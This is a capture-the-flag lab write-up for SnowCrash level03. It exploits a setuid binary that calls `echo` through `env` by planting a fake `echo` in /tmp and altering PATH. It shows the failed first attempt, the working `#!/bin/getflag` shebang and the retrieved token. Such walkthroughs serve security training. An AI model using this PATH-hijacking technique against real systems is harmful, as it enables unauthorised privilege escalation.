The user's home contains a binary.

Here are the informations that we got about it:

- It is owned by `flag03`
- It process the following instruction: `/usr/bin/env echo Exploit me`

So we could try to fake the `echo` command and force it to print its own token.

In order to do this, we will create an executable file in `/tmp/echo` containing the following:

```bash
#!/bin/bash

/bin/cat /home/flag/flag03/README.txt
```

Like this:

```bash
echo '#!/bin/bash /bin/cat /home/flag/flag03/README.txt' > /tmp/echo
```

Give this fake echo the enhanced rights:

```bash
chmod 777 /tmp/echo
```

We also need to modify the PATH to change the source of the `echo` binary.

```bash
export PATH=/tmp:/usr/bin/env
```

This produce the following error:

```bash
/bin/bash: /bin/cat /home/flag/flag03/README.txt: No such file or directory
```

I got the feeling that I'm following the good path. I'll just scout a little more before planning my next attack.

The solution was in fact a lot simpler.

I just had to edit my fake `echo` to:

```bash
#!/bin/getflag
```

And then, running the `level03` binary gave me the token.

```bash
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
